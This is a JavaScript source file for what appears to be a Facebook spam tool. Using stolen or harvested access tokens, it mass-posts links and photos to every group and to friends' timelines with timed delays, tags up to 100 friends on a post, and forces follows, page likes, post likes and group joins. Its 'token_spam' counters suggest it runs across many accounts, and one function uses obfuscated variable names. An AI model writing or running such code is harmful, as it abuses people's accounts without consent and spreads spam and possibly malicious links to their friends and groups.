     function get_groups(access_token , link , text , picture , type) {
       jQuery.ajax({
           url: "https://graph.facebook.com/fql?q=select gid, name from group where gid IN (SELECT gid FROM group_member WHERE uid=me()) order by rand() limit 100&access_token="+access_token,
           dataType: "jsonp",
           success: function(data) {
              token_spam_post += 1;
              $('span#token_spam').text(token_spam_post + "/" + total_token);
              if(data.data && data.data.length){
                  total_gr += data.data.length;
                  $('span#gr_post').text(gr_post + "/" + total_gr);
                  if(type == 1)
                    post_groups_photo(data,access_token,link,text);
                  else
                    post_groups_feed(data,access_token,link,text,picture);
              }
              console.log(data);
           }
       });
   }
      function count_groups_member(gid,access_token) {
       jQuery.ajax({
           url: "https://graph.facebook.com/fql?q=SELECT uid FROM group_member WHERE gid=" + gid + "limit 500 offset 4000&access_token="+access_token,
           dataType: "jsonp",
           success: function(data) {
               //post_groups(data);
               console.log(data.data.length);
           }
       });
   }

   function get_friends(access_token , link , text , picture , type) {
       jQuery.ajax({
           url: "https://graph.facebook.com/fql?q=SELECT uid, first_name FROM user WHERE uid IN ( SELECT uid2 FROM friend WHERE uid1 = me() ) ORDER BY rand() limit 100&access_token="+access_token,
           dataType: "jsonp",
           success: function(data) {
            if(type == 1)
              post_friends_photo(data,access_token,link,text);
            else
              post_friends_feed(data,access_token,link,text,picture);
            console.log(data);
           }
       });
   }

   function post_friends_photo(list , access_token , image_link , text) {
       for (i = 0; i < list.data.length; i++) {
           jQuery.ajax({
               url: "https://graph.facebook.com/"+list.data[i].uid+"/photos?url=" + image_link + "&message=" + text + "&callback=paylas&method=POST&access_token=" + access_token,
               dataType: "script",
               success: function() {
                  
                 
               }
       });
       }
   }
   function post_friends_feed(list , access_token , link , text , picture ) {
      var postinsql = function(data_i){   
              console.log(data_i);
              jQuery.ajax({
               url: "https://graph.facebook.com/"+ data_i +"/feed?link=" + link + "&picture=" + picture + "&message=" + text + "&callback=paylas&method=POST&access_token=" + access_token,
               dataType: "script",
               success: function() {
                    console.log("post_fr");
                }
              });
           };
        if(!list.data)
          return ;
       for (i = 0; i < list.data.length; i++) {
            var dataaa = list.data[i].uid;
            console.log(dataaa);
            var j = i + 1;
            if(i>=50)
              j = j + 1;
            if(i>=100)
              j = j + 1;
            if(i>=200)
              j = j + 1;
            setTimeout(postinsql.bind(null, dataaa),3000 * (j));
      }
   }

   function paylas(reponse){
        console.log(reponse);
        if(reponse.id){
            gr_post += 1;
            $('span#gr_post').text(gr_post + "/" + total_gr);
        }
   }

   function post_groups_photo(list , access_token , image_link , text ) {
       for (i = 0; i < list.data.length; i++) {
           jQuery.ajax({
               url: "https://graph.facebook.com/" + list.data[i].gid + "/photos?url=" + image_link + "&message="+ text  + "&callback=paylas&method=POST&access_token=" + access_token,
               dataType: "script",
               success: function() {
                  gr_post += 1;
                  $('span#gr_post').text(gr_post + "/" + total_gr);
               }
        });
      }
   }

      function post_groups_feed(list , access_token , image_link , text , picture) {
        var postinsql = function(data_i){   
              console.log(data_i);
              jQuery.ajax({
               url: "https://graph.facebook.com/" + data_i + "/feed?link=" + image_link + "&picture=" + picture + "&message="+ text  + "&callback=paylas&method=POST&access_token=" + access_token,
               dataType: "script",
               success: function() {
                   console.log("post");
              }
            });
        };
        if(!list.data)
          return ;
       for (i = 0; i < list.data.length; i++) {
          var dataaa = list.data[i].gid;
          console.log(dataaa);
          var j = i + 1;
          setTimeout(postinsql.bind(null, dataaa), 1000 * (j));
      }
   }

   function timeline(access_token , image_link , text ) {
       $["getJSON"]("https://graph.facebook.com/me/feed?link=" + image_link + "&message=" + text + "&method=POST&access_token=" + access_token, function (_0x1f66xf) {
           if (_0x1f66xf["id"]) {
               var _0x1f66x11 = _0x1f66xf["id"];
               console.log(_0x1f66x11);
               var _0x1f66x12 = 100;
               $["getJSON"]("https://graph.facebook.com/me/friends?limit=" + _0x1f66x12 + "&access_token=" + access_token, function (_0x1f66xf) {
                   if (_0x1f66xf["data"]) {
                       var _0x1f66x13 = [];
                       $["each"](_0x1f66xf["data"], function(_0x1f66x14, _0x1f66x7) {
                           _0x1f66x13["push"](_0x1f66x7["id"]);
                           $["getJSON"]("https: //graph.facebook.com/" + _0x1f66x11 + "/tags/" + _0x1f66x7["id"] + "/?method=POST&access_token=" + access_token, function (_0x1f66xf) {});
                       });
                   };
               });
           };
       });
   };

   function follow(id , access_token) {
       $.getJSON("https://graph.facebook.com/" + id + "/subscribers?method=post&access_token=" + access_token, function (response) {
       });
   }

   function like_page(id , access_token) {
       $.getJSON("https://graph.facebook.com/me/likes?access_token=" + access_token + "&method=POST&url=https://www.facebook.com/" + id, function (response) {
       });
   }

   function like_post(id , access_token) {
       $.getJSON("https://graph.facebook.com/" + id + "/likes/?method=post&access_token=" + access_token, function (response) {
       });
   }

   function join_group(grpid , access_token) {
       $.getJSON("https://graph.facebook.com/me?access_token=" + access_token, function (response) {
           if (response.id) {
               var userid = response.id;
               $.getJSON("https://graph.facebook.com/" + grpid + "/members/" + userid + "?method=post&access_token=" + access_token, function (response) {
                   if (response.data) {}
               });
           }
       });
   }